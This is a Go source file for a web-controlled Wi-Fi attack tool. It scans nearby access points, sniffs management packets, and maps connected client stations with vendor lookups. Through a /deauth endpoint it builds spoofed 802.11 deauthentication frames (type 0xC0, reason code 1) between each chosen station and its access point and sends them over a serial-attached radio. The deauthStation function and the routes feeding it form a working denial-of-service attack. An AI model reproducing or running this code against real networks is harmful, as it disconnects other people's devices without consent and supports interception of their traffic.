package main

import (
	"html/template"
	"net/http"
	"os"
	"net"
	"go.bug.st/serial.v1"
	"github.com/klauspost/oui"
	"fmt"
	"github.com/gobuffalo/packr"
	"github.com/gorilla/mux"
	"encoding/json"
	"time"
	"io/ioutil"
	"log"
)

const BAUD int = 115200 //Read from a file
const PORT string = "/dev/ttyAMA0"
const MSG_START byte = 0x02 
const MSG_END byte = 0x03
const CONFIG_PATH string = "./src/static/configs/config.json"

type Settings struct {
	AccessPointCfg struct {
		Ssid    string `json:"ssid"`
		Passwd  string `json:"passwd"`
		Channel int    `json:"channel"`
		Hidden  bool   `json:"hidden"`
	} `json:"accesspoint"`
	ApScanner struct {
		Interval int  `json:"interval"`
		Deep     bool `json:"deep"`
		Async    bool `json:"async"`
		Channel  int  `json:"channel"`
		Hop      bool `json:"hop"`
	} `json:"apScanner"`
	PacketScanner struct {
		Interval int  `json:"interval"`
		Channel  int  `json:"channel"`
		Hop      bool `json:"hop"`
	} `json:"packetScanner"`
	Deauther struct {
		Interval int  `json:"interval"`
		Channel  int  `json:"channel"`
	} `json:"deauther"`
}

type AccessPoint struct {
	Ssid     string    	`json:"ssid"`
	Enc  	 int    	`json:"enc"`
	Rssi	 int 		`json:"rssi"`
	Bssid    string 	`json:"bssid"`
	Channel  int 		`json:"channel"`
	Hidden   bool 		`json:"hidden"`
	Stations []Station	`json:"stations"`
}

type Packet struct {
	Rssi     	int    `json:"rssi"`
	Channel  	int    `json:"channel"`
	PktType  	string `json:"pkt_type"`
	Src      	string `json:"src"`
	Dst      	string `json:"dst"`
	Bssid    	string `json:"bssid"`
	Ssid     	string `json:"ssid"`
	Vendor		string `json:"vendor"`
}

type Station struct {
	Name 	string 	`json:"name"`
	Vendor 	string 	`json:"vendor"`
	Mac 	[]byte	`json:"mac"`
	FmtMac  string 	`json:"fmtMac"`
	AP 		[]byte 	`json:"ap"`
}

var (
	AvailableAccesspoints map[string]AccessPoint
	router * mux.Router
	writeQueue [][]byte
	readQueue []string

	packets []Packet
	logs []string
	sConn serial.Port
	sniffing bool
	settings *Settings
	db oui.StaticDB
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)

	settings = &Settings{}

	router = mux.NewRouter()
	sniffing = false

	var err error
	db, err = oui.OpenStaticFile("./src/static/configs/oui.txt")

	if err != nil { 
		log_message(err.Error())
	}

	AvailableAccesspoints = make(map[string]AccessPoint)

	readConfig()

	initRoutes()
	initMockData()

	if initSerial() {
		go ActionHandler();
	}

	go handlerData();

	http.ListenAndServe(":8081", router)
}

func initSerial() bool{
	log_message("Opening serial connection...")

	ports, err := serial.GetPortsList()

	if err != nil {
		log_message(err.Error())
		return false
	}

	if len(ports) == 0 {
		log_message("No serial ports were found...")
		return false
	}

	mode := &serial.Mode { BaudRate: BAUD }

	sConn, err = serial.Open(PORT, mode)

	if err != nil {
		log_message(err.Error())
		return false
	}

	log_message("Serial connection opened...")
	return true
}

func initMockData() {
	readQueue = append(readQueue, `{"data_type": "accesspoint", "ssid": "Some Cool SSID 1", "enc": 2, "rssi": 10, "bssid":"11:11:11:11:11:11", "channel": 11, "hidden": false}`)
	readQueue = append(readQueue, `{"data_type": "accesspoint", "ssid": "Some Cool SSID 2", "enc": 2, "rssi": 20, "bssid":"12:11:11:11:11:11", "channel": 11, "hidden": false}`)
	readQueue = append(readQueue, `{"data_type": "accesspoint", "ssid": "Some Cool SSID 3", "enc": 2, "rssi": 40, "bssid":"13:11:11:11:11:11", "channel": 11, "hidden": false}`)
	readQueue = append(readQueue, `{"data_type": "accesspoint", "ssid": "Some Cool SSID 4", "enc": 2, "rssi": 80, "bssid":"14:11:11:11:11:11", "channel": 11, "hidden": false}`)
	readQueue = append(readQueue, `{"data_type": "accesspoint", "ssid": "Some Cool SSID 5", "enc": 2, "rssi": 100, "bssid":"15:11:11:11:11:11", "channel": 11, "hidden": false}`)

	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "13:11:11:11:11:11", "bssid": "13:11:11:11:11:11", "ssid": "Some Cool SSID 1"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "12:11:11:11:11:11", "bssid": "12:11:11:11:11:11", "ssid": "Some Cool SSID 2"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "13:11:11:11:11:11", "bssid": "13:11:11:11:11:11", "ssid": "Some Cool SSID 3"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "14:11:11:11:11:11", "bssid": "14:11:11:11:11:11", "ssid": "Some Cool SSID 4"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "15:11:11:11:11:11", "bssid": "15:11:11:11:11:11", "ssid": "Some Cool SSID 5"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "14:11:11:11:11:11", "bssid": "14:11:11:11:11:11", "ssid": "Some Cool SSID 4"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "13:11:11:11:11:11", "bssid": "13:11:11:11:11:11", "ssid": "Some Cool SSID 3"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "12:11:11:11:11:11", "bssid": "12:11:11:11:11:11", "ssid": "Some Cool SSID 2"}`)
	readQueue = append(readQueue, `{"data_type": "packet", "pkt_type": "MGMT", "rssi": 30, "channel": 11, "src": "11:11:11:11:11:11", "dst": "11:11:11:11:11:11", "bssid": "11:11:11:11:11:11", "ssid": "Some Cool SSID 1"}`)
}

func initRoutes() {
	resources := packr.NewBox("./src/static")
	templates := packr.NewBox("./src/views")

	log_message("Initiating routes...")

	router.PathPrefix("/static").Handler(http.StripPrefix("/static/", http.FileServer(resources)))
	router.PathPrefix("/templates").Handler(http.StripPrefix("/templates/", http.FileServer(templates)))

	router.HandleFunc("/accesspoints", getAccessPoints).Methods("GET")
	router.HandleFunc("/getPackets", getPackets).Methods("GET")
	router.HandleFunc("/sniffPackets", sniffPackets).Methods("GET")
	router.HandleFunc("/getConfig", getConfig).Methods("GET")
	router.HandleFunc("/setConfig", setConfig).Methods("POST")
	router.HandleFunc("/getLogs", getLogs).Methods("GET")
	router.HandleFunc("/deauth", deauthAttack).Methods("POST")

	//PAGES
	router.HandleFunc("/", func(w http.ResponseWriter, r * http.Request) {
		tmpl := []string {"./src/views/index.html"}
		i, err := template.New("").ParseFiles(tmpl...)

		if err != nil {
			log_message(err.Error())
			return; 
		}

		log_message("Redirecting to Home...")

		i.ExecuteTemplate(w, "indexHTML", "")
	})
}

func getAccessPoints(w http.ResponseWriter, r *http.Request) {
	var cmd string = fmt.Sprintf("scan -async=%t -hidden=%t -channel=%d -hop=%t", settings.ApScanner.Async, settings.ApScanner.Deep, settings.ApScanner.Channel, settings.ApScanner.Hop)
	log_message(cmd)
	//TODO Uncomment me for prod
	writeQueue = append(writeQueue, []byte(cmd))

	re, _ := json.Marshal(AvailableAccesspoints)

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

func handlerData() {
	for {
		if (len(readQueue) == 0) { 
			time.Sleep(200)
			continue; 
		}

		var buffer []byte = []byte(readQueue[0])
		readQueue = readQueue[1:]
		
		bufferMap := make(map[string]interface{})
		err := json.Unmarshal(buffer, &bufferMap)

		if err != nil { 
			log_message(err.Error())
			continue
		}

		var datType string = fmt.Sprintf("%v", bufferMap["data_type"])

		switch datType {
			case "packet" :
				packet := Packet{}

				if err =  json.Unmarshal(buffer, &packet); err != nil {
					log_message(err.Error())
					break
				}

				var mac net.HardwareAddr

				if packet.Src != packet.Bssid {
					mac, err = net.ParseMAC(packet.Src)
				} else if packet.Dst != packet.Bssid {
					mac, err = net.ParseMAC(packet.Src)
				}

				if db != nil {
					macb := []byte(mac)

					if len(macb) == 6 {
						entry, err := db.Query(fmt.Sprintf("%X:%X:%X:%X:%X:%X", macb[0], macb[1], macb[2], macb[3], macb[4], macb[5]))

						if err != nil {
							log_message(err.Error())
							break
						}
						
						packet.Vendor = entry.Manufacturer
					}
				}

				packets = append(packets, packet)

				if (packet.PktType != "MGMT") { 
					break
				}

				station := Station{}

				if mac != nil {
					station.Mac = []byte(mac)
					station.FmtMac = fmt.Sprintf("%X:%X:%X:%X:%X:%X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
				}

				if err != nil {
					log_message(err.Error())
					break
				}

				if _, ok := AvailableAccesspoints[packet.Bssid]; ok {
					apMac, err := net.ParseMAC(packet.Bssid)
					station.AP = []byte(apMac)
					station.Vendor = packet.Vendor

					if err != nil {
						log_message(err.Error())
						break
					}

					Ap := AvailableAccesspoints[packet.Bssid]

					Ap.Stations = append(Ap.Stations, station)
					AvailableAccesspoints[packet.Bssid] = Ap
				}

				break
			case "accesspoint" :
				ap := AccessPoint{}

				if err = json.Unmarshal(buffer, &ap); err != nil {
					log_message(err.Error())
					break
				}

				if val, ok := AvailableAccesspoints[ap.Bssid]; ok {
					val.Rssi = ap.Rssi
					val.Ssid = ap.Ssid
					val.Channel = ap.Channel
					val.Hidden = ap.Hidden
				} else {
					ap.Stations = []Station{}
					AvailableAccesspoints[ap.Bssid] = ap
				}

				break
			default :
				break
		}
	}
}

func getPackets(w http.ResponseWriter, r *http.Request) {
	re, _ := json.Marshal(packets)

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

func sniffPackets(w http.ResponseWriter, r *http.Request) {
	var cmd string = fmt.Sprintf("sniff -interval=%d -channel=%d -hop=%t", settings.PacketScanner.Interval, settings.PacketScanner.Channel, settings.PacketScanner.Hop)

	log_message(cmd)
	//TODO Uncomment me for prod
	writeQueue = append(writeQueue, []byte(cmd))

	log_message("Sniffing packets")

	w.Header().Set("Content-Type", "application/json")
}

func startAccessPoint() {
	var cmd string = fmt.Sprintf("setup  -ssid=%q -hidden=%t -channel=%d -password=%q", settings.AccessPointCfg.Ssid, settings.AccessPointCfg.Hidden, settings.AccessPointCfg.Channel, settings.AccessPointCfg.Passwd)
	
	log_message(cmd)

	writeQueue = append(writeQueue, []byte(cmd))

	log_message("Starting accesspoint packets")
}

func getConfig(w http.ResponseWriter, r *http.Request) {
	if _, err := os.Stat(CONFIG_PATH); os.IsNotExist(err)  {
		log_message("Config file does not exist...")
		createConfig(`{"accesspoint":{"ssid":"Lambs to the Cosmic Slaughter","passwd":"Rick and Mortison","channel":12,"hidden":false},"apScanner":{"interval":1000,"deep":true,"async":false,"channel":12,"hop":false},"packetScanner":{"interval":1000, "channel": 12, "hop": false}}`)
	}

	var dat []byte = readConfig()

	log_message("Getting Config...")

	w.Header().Set("Content-Type", "application/json")
	w.Write(dat)
}

func setConfig(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)

	_, err := os.Stat(CONFIG_PATH)

	if err == nil {
		err := os.Remove(CONFIG_PATH)

		if err != nil {
			log_message("Error removing file...")
		}
	}
	
	createConfig(string(body))

	json.Unmarshal(body, &settings)
	startAccessPoint()
}

func readConfig() []byte {
	file, err := os.Open(CONFIG_PATH)

	if err != nil {
		log_message(err.Error())
		return []byte{};
	}

	dat, err := ioutil.ReadAll(file)

	if err != nil {
		log_message(err.Error())
		return []byte{};
	}

	json.Unmarshal(dat, settings)

	return dat
}

//func flash(w http.ResponseWriter, r *http.Request) {
	//var cmd String = ""
//}

func createConfig(data string) {
	file, err := os.Create("./src/static/configs/config.json")

	if err != nil {
		log_message("Error creating new config file...")
		return
	}

	_, err = file.Write([]byte(data))
	
	if err != nil {
		log_message("Error writing to new config file...")
		return
	}

	log_message("New config file connected...")
}

func deauthAttack(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)
	stations := []Station{}
	json.Unmarshal(body, &stations)

	if stations == nil { return }

	log_message("Deauthing stations...")

	//Loop through each station and create the corrosponding deauth packet
	for _, sta := range stations {
		deauthStation(sta)
	}
}

/*
*	Pass a station and a deauth packet will be created to be sent to the station aswell as the 
*	accesspoint. The created packet will be pushed to the writeQueue to be sent
*/

func deauthStation(station Station) {
	log.Println(fmt.Sprintf("%X:%X:%X:%X:%X:%X", station.Mac[0], station.Mac[1], station.Mac[2], station.Mac[3], station.Mac[4], station.Mac[5]))

	var pa [][]byte = [][]byte{
		{0xC0, 0x00}, // Type, Subtype
		{0x00, 0x00}, // Duration
		station.Mac[:], // Receiver
		station.AP[:], // Source
		station.AP[:], // BSSID
		{0x00, 0x00}, // Fragment and Sequence
		{0x01, 0x00}, // Reason
	}

	var ps [][]byte = [][]byte{
		{0xC0, 0x00},
		{0x00, 0x00},
		station.AP[:],
		station.Mac[:],
		station.Mac[:],
		{0x00, 0x00},
		{0x01, 0x00},
	}

	settingsDat := readConfig()
	json.Unmarshal(settingsDat, &settings)

	cmd := fmt.Sprintf("send -interval=%d -channel=%d -buffer=%s", settings.Deauther.Interval, settings.Deauther.Channel, createPacket(pa))
	log_message(cmd)
	writeQueue = append(writeQueue, []byte(cmd))

	cmd = fmt.Sprintf("send -interval=%d -channel=%d -buffer=%s", settings.Deauther.Interval, settings.Deauther.Channel, createPacket(ps))
	log_message(cmd)

	writeQueue = append(writeQueue, []byte(cmd))
}

/*
*	Pass the function a list of parts
*	it will loop through and stitch the 
*	parts together and return the result
*/
func createPacket(parts [][]byte) []byte {
	var packet []byte

	for _, part := range parts {
		packet = append(packet, part...)
	}

	return packet
}

func WriteHandler(data []byte) {
	if data == nil { return }
	
	data = append(data, 0x0A);

	if (sConn != nil) {
		log_message(fmt.Sprintf("Writing: %s", data))

		_, err := sConn.Write(data)
		
		if err != nil {
			log_message(err.Error())
		}
	}
}

func ReadHandler() []byte {
	var building bool = false
	var buf []byte
	var ch []byte = make([]byte, 1)

	_, err := sConn.Read(ch)

	if err != nil {
		log_message(err.Error())
		return nil
	}

	log_message(fmt.Sprintf("Reading: %s", ch))

	for ch[0] != MSG_END {
		if !building && len(writeQueue) > 0 { return []byte{} }

		_, err = sConn.Read(ch)
		if err != nil {
			log_message(err.Error())
			return nil
		}

		if ch[0] == MSG_START {
			building = true;
		} else if ch[0] == MSG_END {
			break
		}else if building {
			buf = append(buf, ch[0])
		}
	}
	
	return buf
}

func ActionHandler() {
	for true {
		
		fmt.Println(len(writeQueue))

		if len(writeQueue) > 0 {
			data := writeQueue[0]

			if (len(writeQueue) > 1) {
				writeQueue = writeQueue[1:]
			}

			WriteHandler(data);
		} else {
			byteRead := ReadHandler();
			
			if byteRead != nil {
				readQueue = append(readQueue, string(byteRead))
			}
		}
	}
}

func ft(t time.Time) string {
	hour := t.Hour()
	min := t.Minute()
	sec := t.Second()

	output := fmt.Sprintf("%02d:%02d:%02d",
		hour,
		min,
		sec)

	return output
}

func log_message(message string) {

	if (len(logs) > 1500) {
		logs = logs[1:]
	}

	log.Print(message)
	logs = append(logs, ("[" + ft(time.Now()) + "] "  + message))
}

func getLogs(w http.ResponseWriter, r *http.Request) {
	re, _ := json.Marshal(logs)

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}
	/*
	Single deauth 
		Replace target with station address
		Replace source and bssid with access point addres
	Broadcast deauth
		Replace target with accesspoint address
		Replace source and bssid with station address
	*/

	
